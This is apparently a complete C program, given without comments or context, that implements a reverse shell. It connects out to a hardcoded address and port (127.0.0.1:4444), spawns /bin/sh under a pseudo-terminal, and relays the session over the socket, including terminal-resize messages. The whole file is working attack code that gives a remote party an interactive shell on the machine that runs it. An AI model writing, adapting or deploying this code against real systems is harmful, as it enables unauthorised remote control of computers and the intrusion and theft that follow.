#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <arpa/inet.h>
#include <unistd.h>

#if defined(__linux__)
    #include <pty.h>
    #include <wait.h>
#elif defined(__APPLE__) || defined(__FreeBSD__) || defined(__OpenBSD__) || defined(__NetBSD__)
    #include <util.h>
    #include <sys/wait.h>
    #include <sys/ioctl.h>
#endif

#include <poll.h>
#include <errno.h>

typedef struct sockaddr_in sockaddr_in;
typedef struct sockaddr sockaddr;
typedef struct pollfd pollfd;
typedef struct winsize winsize;

void monitorFD(int socketFD, int ptyFD)
{
    char buffer[4096];
    ssize_t bytesRead, peek;
    pollfd fds[2];
    uint8_t marker = 0xFF;
    winsize ws;

    fds[0].fd = socketFD;
    fds[0].events = POLLIN;

    fds[1].fd = ptyFD;
    fds[1].events = POLLIN;

    while (true)
    {
        if (poll(fds, 2, -1) < 0)
        {
            if (errno == EINTR) continue;
            perror("poll");
            break;
        }

        if (fds[0].revents & (POLLIN | POLLHUP))
        {
            peek = recv(socketFD, &marker, 1, MSG_PEEK);
            if (peek == 1 && marker == 0xFF)
            {
                read(socketFD, &marker, 1);
                if (read(socketFD, &ws, sizeof(ws)) == sizeof(ws))
                {
                    ioctl(ptyFD, TIOCSWINSZ, &ws);
                }
                continue;
            }
            bytesRead = read(socketFD, buffer, sizeof(buffer));
            if (bytesRead <= 0) break;
            if (write(ptyFD, buffer, (size_t)bytesRead) < 0) break;
        }

        if (fds[1].revents & (POLLIN | POLLHUP))
        {
            bytesRead = read(ptyFD, buffer, sizeof(buffer));
            if (bytesRead <= 0) break;
            if (write(socketFD, buffer, (size_t)bytesRead) < 0) break;
        }
        if (fds[0].revents & (POLLERR | POLLNVAL)) break;
        if (fds[1].revents & (POLLERR | POLLNVAL)) break;
    }
}

void createPTY(int socketFD)
{
    int ptyFD;
    pid_t childOnePID, childTwoPID;

    childOnePID = forkpty(&ptyFD, NULL, NULL, NULL);

    if (childOnePID < 0)
    {
        perror("forkpty");
        exit(EXIT_FAILURE);
    }

    if (childOnePID == 0)
    {
        execl("/bin/sh", "sh", NULL);
        perror("execl");
        exit(EXIT_FAILURE);
    }

    childTwoPID = fork();
    if (childTwoPID < 0)
    {
        perror("fork");
        exit(EXIT_FAILURE);
    }

    if (childTwoPID == 0)
    {
        monitorFD(socketFD, ptyFD);
        close(socketFD);
        close(ptyFD);
        waitpid(childOnePID, NULL, 0);
    }

    if (childTwoPID > 0) return;
}

int connectToServer(const char *IP, const uint16_t PORT)
{
    int socketFD;
    sockaddr_in sa;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(IP);
    sa.sin_port = htons(PORT);

    socketFD = socket(AF_INET, SOCK_STREAM, 0);
    if (socketFD < 0)
    {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    if (connect(socketFD, (sockaddr*)&sa, sizeof(sa)) != 0)
    {
        perror("connect");
        exit(EXIT_FAILURE);
    }
    return socketFD;
}

int main(void)
{
    const char *IP = "127.0.0.1";
    const uint16_t PORT = 4444;
    int socketFD = connectToServer(IP, PORT);
    createPTY(socketFD);
    return 0;
}
